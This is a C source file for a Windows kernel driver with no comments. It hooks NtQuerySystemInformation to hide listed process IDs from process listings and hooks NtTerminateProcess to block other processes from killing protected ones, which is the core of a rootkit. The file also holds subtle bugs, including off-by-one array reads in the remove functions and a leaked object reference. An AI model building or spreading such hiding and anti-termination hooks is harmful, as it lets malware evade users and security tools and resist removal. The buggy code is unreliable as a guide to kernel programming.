
#ifdef __cplusplus
extern "C" 
{
#endif
#include "inc.h"
#ifdef __cplusplus
}
#endif

ULONG ValidateProcessNeedHide(ULONG uPID)
{
	ULONG i = 0;
	if(uPID == 0)	
	{
		return -1;
	}

	for(i=0; i<g_currHideArrayLen && i<MAX_PROCESS_ARRARY_LENGTH; i++)
	{
		if(g_PIDHideArray[i] == uPID)
		{
			return i;
		}
	}
	return -1;
}
ULONG ValidateProcessNeedProtect(ULONG uPID)
{
	ULONG i = 0;
	if(uPID == 0)
	{
		return -1;
	}

	for(i=0; i<g_currProtectArrayLen && i<MAX_PROCESS_ARRARY_LENGTH;i++)
	{
		if(g_PIDProtectArray[i] == uPID)
		{
			return i;
		}
	}
	return -1;
}
ULONG InsertHideProcess(ULONG uPID)
{
	if(ValidateProcessNeedHide(uPID) == -1 && g_currHideArrayLen < MAX_PROCESS_ARRARY_LENGTH)
	{
		g_PIDHideArray[g_currHideArrayLen++] = uPID;
		return TRUE;
	}
	return FALSE;
}
ULONG RemoveHideProcess(ULONG uPID)
{
	ULONG uIndex = ValidateProcessNeedHide(uPID);
	if(uIndex != -1)
	{
		g_PIDHideArray[uIndex] = g_PIDHideArray[g_currHideArrayLen--];
		return TRUE;
	}
	return FALSE;
}
ULONG InsertProtectProcess(ULONG uPID)
{
	if(ValidateProcessNeedProtect(uPID) == -1 && g_currProtectArrayLen < MAX_PROCESS_ARRARY_LENGTH)
	{
		g_PIDProtectArray[g_currProtectArrayLen++] = uPID;

		return TRUE;
	}
	return FALSE;
}
ULONG RemoveProtectProcess(ULONG uPID)
{
	ULONG uIndex = ValidateProcessNeedProtect(uPID);
	if(uIndex != -1)
	{
		g_PIDProtectArray[uIndex] = g_PIDProtectArray[g_currProtectArrayLen--];

		return TRUE;
	}
	return FALSE;
}

NTSTATUS MyNtQuerySystemInformation (
									   __in SYSTEM_INFORMATION_CLASS SystemInformationClass,
									   __out_bcount_opt(SystemInformationLength) PVOID SystemInformation,
									   __in ULONG SystemInformationLength,
									   __out_opt PULONG ReturnLength
									   )
{
	NTSTATUS rtStatus;
	pOldNtQuerySystemInformation = (NTQUERYSYSTEMINFORMATION)oldSysServiceAddr[SYSCALL_INDEX(ZwQuerySystemInformation)];
	rtStatus = pOldNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
	if(NT_SUCCESS(rtStatus))
	{
		if(SystemProcessInformation == SystemInformationClass)
		{
			PSYSTEM_PROCESS_INFORMATION pPrevProcessInfo = NULL;
			PSYSTEM_PROCESS_INFORMATION pCurrProcessInfo = (PSYSTEM_PROCESS_INFORMATION)SystemInformation; 

			while(pCurrProcessInfo != NULL)
			{
				ULONG uPID = (ULONG)pCurrProcessInfo->UniqueProcessId;
				UNICODE_STRING strTmpProcessName = pCurrProcessInfo->ImageName;

				if(ValidateProcessNeedHide(uPID) != -1)
				{
					if(pPrevProcessInfo)
					{
						if(pCurrProcessInfo->NextEntryOffset)
						{
							pPrevProcessInfo->NextEntryOffset += pCurrProcessInfo->NextEntryOffset;
						}
						else
						{
							pPrevProcessInfo->NextEntryOffset = 0;
						}
					}
					else
					{
						if(pCurrProcessInfo->NextEntryOffset)
						{
							(PCHAR)SystemInformation += pCurrProcessInfo->NextEntryOffset;
						}
						else
						{
							SystemInformation = NULL;
						}
					}
				}

				pPrevProcessInfo = pCurrProcessInfo;

				if(pCurrProcessInfo->NextEntryOffset)
				{
					pCurrProcessInfo = (PSYSTEM_PROCESS_INFORMATION)(((PCHAR)pCurrProcessInfo) + pCurrProcessInfo->NextEntryOffset);
				}
				else
				{
					pCurrProcessInfo = NULL;
				}
			}
		}
	}
	return rtStatus;
}

NTSTATUS MyNtTerminateProcess(
								__in_opt HANDLE ProcessHandle,
								__in NTSTATUS ExitStatus
								)
{
	ULONG uPID;
	NTSTATUS rtStatus;
	PCHAR pStrProcName;
	PEPROCESS pEProcess;
	ANSI_STRING strProcName;

	rtStatus = ObReferenceObjectByHandle(ProcessHandle, FILE_READ_DATA, NULL, KernelMode, &pEProcess, NULL);
	if(!NT_SUCCESS(rtStatus))
	{
		return rtStatus;
	}

	pOldNtTerminateProcess = (NTTERMINATEPROCESS)oldSysServiceAddr[SYSCALL_INDEX(ZwTerminateProcess)];

	uPID = (ULONG)PsGetProcessId(pEProcess);
	pStrProcName = (PCHAR)PsGetProcessImageFileName(pEProcess);

	RtlInitAnsiString(&strProcName, pStrProcName);

	if(ValidateProcessNeedProtect(uPID) != -1)
	{
		if(uPID != (ULONG)PsGetProcessId(PsGetCurrentProcess()))
		{
			return STATUS_ACCESS_DENIED;
		}
	}

	rtStatus = pOldNtTerminateProcess(ProcessHandle, ExitStatus);

	return rtStatus;
}